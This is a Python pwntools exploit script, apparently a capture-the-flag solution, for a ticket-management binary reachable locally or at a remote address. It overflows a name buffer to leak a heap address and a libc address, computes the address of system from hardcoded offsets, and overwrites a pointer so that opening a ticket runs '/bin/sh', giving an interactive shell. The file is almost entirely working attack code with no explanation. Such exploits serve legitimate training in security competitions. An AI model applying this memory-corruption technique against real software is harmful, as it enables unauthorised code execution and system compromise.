# coding:utf-8

from pwn import *
import sys

context.log_level = "debug"

if sys.argv[1]:
    p = remote("49.4.23.26", 30474)
else:
    p = process("./task_main")


def get_ticket(len, name):
    p.sendlineafter("Choice >> \n", "1")
    p.sendlineafter("The length of my owner's name:\n", str(len))
    p.sendafter("Give me my owner's name:\n", name)

def change_owner(index, len, name):
    p.sendlineafter("Choice >> \n", "3")
    p.sendlineafter("want to change it's owner's name?\n", str(index))
    p.sendlineafter("The length of my owner's name:\n", str(len))
    p.sendafter("Give me my owner's name:\n", name)

def open_ticket(index):
    p.sendlineafter("Choice >> \n", "2")
    p.sendlineafter(" you want to open?\n", str(index))

def main():
    raw_input("oooooooooooooooooooooh")
    get_ticket(0x100, 'b'*16+'\n')
    get_ticket(0x200, '/bin/sh\x00'+'\n')
    
    change_owner(0, 0x111, 'a'*0x110)
    open_ticket(0)
    p.recvuntil('a'*0x110)
    heap_addr = u64(p.recvuntil("\n").strip().ljust(8, '\x00'))
    info("leak heap addr is: 0x%x" % heap_addr)

    change_owner(0, 0x111+8, 'a'*0x118)
    open_ticket(0)
    p.recvuntil('a'*0x118)
    IO_puts_addr = u64(p.recvuntil("\n").strip().ljust(8, '\x00'))
    info("IO_puts addr is: 0x%x" % IO_puts_addr)

    system_addr = IO_puts_addr - 0x000000000006f690 + 0x0000000000045390
    change_owner(0, 0x121, 'a'*0x110+p64(heap_addr)+p64(system_addr))
    open_ticket(1)

    p.interactive()

if __name__ == '__main__':
    main()